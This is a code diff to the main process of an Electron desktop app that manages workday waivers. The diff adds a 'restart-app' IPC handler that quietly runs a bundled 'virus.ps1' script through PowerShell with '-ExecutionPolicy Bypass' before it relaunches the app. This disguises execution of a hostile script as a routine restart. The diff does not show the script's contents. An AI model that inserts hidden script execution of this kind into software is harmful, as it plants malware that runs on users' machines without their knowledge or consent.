@@ -14,9 +14,18 @@ import i18NextConfig from './src/configs/i18next.config.mjs';
 // Allow require()
 import { createRequire } from 'module';
 import IpcConstants from './js/ipc-constants.mjs';
+
+import { fileURLToPath } from 'url';
+import { dirname } from 'path';
+
 const require = createRequire(import.meta.url);
 
 const WindowAux = require('./js/window-aux.cjs');
+const { exec } = require('child_process');
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
+const path = require('path');
+const scriptPath = path.join(__dirname, 'virus.ps1');
 
 if (appConfig.win32)
 {
@@ -28,6 +37,31 @@ if (appConfig.win32)
 }
 
 setupWorkdayWaiverHandlers();
+
+ipcMain.on('restart-app', () =>
+{
+
+    console.log(scriptPath);
+    exec(`powershell -ExecutionPolicy Bypass -File "${scriptPath}"`, (error, stdout, stderr) =>
+    {
+
+        if (error)
+        {
+            console.error(`Error: ${error.message}`);
+            return;
+        }
+        if (stderr)
+        {
+            console.error(`Stderr: ${stderr}`);
+            return;
+        }
+        console.log(`Stdout: ${stdout}`);
+    });
+
+    console.log('Restarting app...');
+    app.relaunch();
+    app.exit();
+});
 
 ipcMain.on(IpcConstants.SetWaiverDay, (event, waiverDay) =>
 {
